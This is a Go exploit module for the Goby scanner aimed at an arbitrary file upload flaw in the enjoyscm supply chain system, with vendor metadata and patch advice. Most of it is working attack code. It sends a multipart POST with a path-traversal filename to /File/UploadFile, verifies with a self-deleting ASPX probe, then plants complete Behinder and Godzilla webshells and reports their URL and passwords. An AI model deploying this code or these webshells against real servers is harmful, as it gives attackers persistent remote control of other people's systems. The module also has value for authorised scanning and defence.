package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "enjoyscm UploadFile Arbitrary File Upload Vulnerability",
    "Description": "<p>enjoyscm is a supply chain management system used by some domestic supermarkets.</p><p>There is an arbitrary file upload vulnerability in enjoyscm UploadFile, attackers can upload malicious Trojan horses to obtain server permissions.</p>",
    "Product": "enjoyscm",
    "Homepage": "http://www.enjoyit.com.cn/",
    "DisclosureDate": "2023-02-23",
    "Author": "h1ei1",
    "FofaQuery": "body=\"供应商网上服务厅\"",
    "GobyQuery": "body=\"供应商网上服务厅\"",
    "Level": "2",
    "Impact": "<p>There is an arbitrary file upload vulnerability in enjoyscm UploadFile, attackers can upload malicious Trojan horses to obtain server permissions.</p>",
    "Recommendation": "<p>1, at present, the vendor has released security patches, please update: <a href=\"http://www.enjoyit.com.cn/.\">http://www.enjoyit.com.cn/.</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webShell,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abc.txt",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "dfsre",
            "show": "attackType=custom"
        },
        {
            "name": "webShell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webShell"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "enjoyscm 供应链管理系统 UploadFile 任意文件上传漏洞",
            "Product": "enjoyscm",
            "Description": "<p>enjoyscm是国内部分超市使用的一种供应链管理系统。<br></p><p>enjoyscm UploadFile 存在任意文件上传漏洞，攻击者可上传恶意木马获取服务器权限。<br></p>",
            "Recommendation": "<p>1、目前厂商已发布安全补丁，请及时更新：<a href=\"http://www.enjoyit.com.cn/\">http://www.enjoyit.com.cn/</a>。<br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>enjoyscm UploadFile 存在任意文件上传漏洞，攻击者可上传恶意木马获取服务器权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "enjoyscm UploadFile Arbitrary File Upload Vulnerability",
            "Product": "enjoyscm",
            "Description": "<p>enjoyscm is a supply chain management system used by some domestic supermarkets.<br></p><p>There is an arbitrary file upload vulnerability in enjoyscm UploadFile, attackers can upload malicious Trojan horses to obtain server permissions.<br></p>",
            "Recommendation": "<p>1, at present, the vendor has released security patches, please update: <a href=\"http://www.enjoyit.com.cn/.\">http://www.enjoyit.com.cn/.</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
            "Impact": "<p>There is an arbitrary file upload vulnerability in enjoyscm UploadFile, attackers can upload malicious Trojan horses to obtain server permissions.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-01",
    "PocId": "10812"
}`
	uploadFileSUIOUWE := func(hostInfo *httpclient.FixUrl, filename, fileContent string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/File/UploadFile")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Data = fmt.Sprintf("-----------------------------21909179191068471382830692394\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../%s\"\r\nContent-Type: image/jpeg\r\n\r\n%s\r\n-----------------------------21909179191068471382830692394\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nunloadfile\r\n-----------------------------21909179191068471382830692394\r\nContent-Disposition: form-data; name=\"filepath\"\r\n\r\n\r\n-----------------------------21909179191068471382830692394\r\n", filename, fileContent)
		cfg.Header.Store("Content-Type", "multipart/form-data; boundary=---------------------------21909179191068471382830692394")
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}
		return resp, nil
	}

	verifyStatusJIOSUD := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig("/" + filename)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randName := goutils.RandomHexString(6) + ".aspx"
			fileContent := "<%@Page Language=\"C#\"%><% Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\"ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=\")));\r\nSystem.IO.File.Delete(Request.PhysicalPath);%>"
			resp, _ := uploadFileSUIOUWE(hostInfo, randName, fileContent)
			if resp.StatusCode != 404 {
				resp2, _ := verifyStatusJIOSUD(hostInfo, randName)
				return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "e165421110ba03099a1c0393373c5b43")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["attackType"].(string)
			webShell := ss.Params["webShell"].(string)
			fileContent := ss.Params["content"].(string)
			fileName := ss.Params["filename"].(string)
			if attackType == "webShell" {
				fileName = goutils.RandomHexString(6) + ".aspx"
				if webShell == "behinder" {
					fileContent = `<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%Session.Add("k","e45e329feb5d925b"); byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>`
				} else if webShell == "godzilla" {
					fileContent = `<%
Set bypassDictionary = Server.CreateObject("Scripting.Dictionary")
Function Base64Decode(ByVal vCode)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    Base64Decode = oNode.nodeTypedValue
    Set oNode = Nothing
    Set oXML = Nothing
End Function
Function decryption(content,isBin)
    dim size,i,result,keySize
    keySize = len(key)
    Set BinaryStream = CreateObject("ADODB.Stream")
    BinaryStream.CharSet = "iso-8859-1"
    BinaryStream.Type = 2
    BinaryStream.Open
    if IsArray(content) then
        size=UBound(content)+1
        For i=1 To size
            BinaryStream.WriteText chrw(ascb(midb(content,i,1)) Xor Asc(Mid(key,(i mod keySize)+1,1)))
        Next
    end if
    BinaryStream.Position = 0
    if isBin then
        BinaryStream.Type = 1
        decryption=BinaryStream.Read()
    else
        decryption=BinaryStream.ReadText()
    end if

End Function
    key="3c6e0b8a9c15224a"
    content=request.Form("pass")
    if not IsEmpty(content) then

        if  IsEmpty(Session("payload")) then
            content=decryption(Base64Decode(content),false)
            Session("payload")=content
            response.End
        else
            content=decryption(Base64Decode(content),true)
            bypassDictionary.Add "payload",Session("payload")
            Execute(bypassDictionary("payload"))
            result=run(content)
            response.Write("11cd6a")
            if not IsEmpty(result) then
                response.Write Base64Encode(decryption(result,true))
            end if
            response.Write("ac826a")
        end if
    end if
%>`
				}
			}
			resp, _ := uploadFileSUIOUWE(expResult.HostInfo, fileName, fileContent)
			if resp.StatusCode == 404 {
				return expResult
			}
			expResult.Success = true
			expResult.Output = fmt.Sprintf("WebShell URL: %s\n", expResult.HostInfo.FixedHostInfo+"/"+fileName)
			if attackType == "custom" {
				expResult.Output = strings.ReplaceAll(expResult.Output, "WebShell ", "")
			}
			if attackType != "custom" && webShell == "behinder" {
				expResult.Output += "Password: rebeyond\n"
				expResult.Output += "WebShell tool: Behinder v3.0\n"
				expResult.Output += "Webshell type: aspx"
			} else if attackType != "custom" && webShell == "godzilla" {
				expResult.Output += "Password: pass 加密器：ASP_XOR_BASE64\n"
				expResult.Output += "WebShell tool: Godzilla v4.0.1\n"
				expResult.Output += "Webshell type: aspx"
			}

			return expResult
		},
	))
}
